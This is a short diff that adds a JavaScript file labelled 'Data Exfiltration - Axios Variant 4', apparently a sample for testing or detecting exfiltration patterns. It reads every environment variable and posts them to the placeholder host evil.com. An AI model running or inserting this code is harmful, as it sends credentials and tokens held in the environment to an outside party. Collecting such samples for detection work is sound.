@@ -1,0 +1,7 @@
+// Data Exfiltration - Axios Variant 4
+const fs = require('fs');
+const axios = require('axios');
+const env = JSON.stringify(process.env);
+axios.post('http://evil.com/env', { env });
+
+// Variant 4
